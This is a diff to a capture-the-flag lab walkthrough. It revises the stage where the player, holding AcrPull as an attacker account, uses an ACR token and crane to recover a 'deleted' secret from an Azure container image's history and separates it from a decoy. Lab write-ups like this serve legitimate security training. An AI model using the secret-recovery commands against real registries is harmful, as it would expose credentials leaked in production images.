@@ -67,28 +67,33 @@ az login --username <attacker_upn> --password <attacker_password>
 ### Stage 1 — ACR image (AcrPull on the registry)
 
 The bootstrap unlock grants AcrPull (+ Reader so the CLI can resolve the
-registry). Inspecting an image needs **Docker**, and the Cumulonimbus container
-has no Docker daemon — so run this stage on a machine that has Docker (for
-example your own host, where you launched the container). Make sure `az` is
-logged in as the attacker there too.
+registry). The Cumulonimbus container has **no Docker daemon**, so use `crane`
+(a single-binary registry client, pre-installed in the image) to pull and
+inspect the image with just an ACR token:
 
 ```bash
 ACR=<acr-name>
-az acr login --name $ACR
+TOKEN=$(az acr login -n $ACR --expose-token --query accessToken -o tsv)
+crane auth login $ACR.azurecr.io -u 00000000-0000-0000-0000-000000000000 -p "$TOKEN"
+
 IMG=$ACR.azurecr.io/cumulonimbus/app:latest
-docker pull $IMG
 
-# Running it shows a config file — but that token is an OLD rotated decoy:
-docker run --rm $IMG cat /app/config/app.config
+# The REAL flag is recorded in the image history (a RUN wrote it into a layer,
+# a later RUN "deleted" it — but the command text and the layer remain):
+crane config $IMG | grep -ao 'CUMULONIMBUS{[^}]*}' | sort -u
 
-# The REAL flag was written into a layer then "deleted"; the command text and
-# the layer still ship in the image, so recover it from the history:
-docker history --no-trunc $IMG | grep -i deploy_token
-# (or: docker save $IMG -o img.tar && tar -xf img.tar && grep -rao 'CUMULONIMBUS{[^}]*}' .)
+# The decoy is the file that survives in the running filesystem:
+crane export $IMG - | grep -ao 'CUMULONIMBUS{[^}]*}' | sort -u
 ```
 
 The `DEPLOY_TOKEN` value (not the `legacy_deploy_token` decoy) is the flag.
 Submit it → unlocks **Reader on the Container Instance**.
+
+> Prefer other tools? `skopeo`, `oras`, or Docker (`az acr login` + `docker
+> pull` + `docker history --no-trunc`) all work the same way if you have them.
+> To pull `crane` yourself: `curl -sL
+> https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz
+> | tar -xz -C /usr/local/bin crane`.
 
 ### Stage 2 — Container Instance env vars (Reader on the container)
 
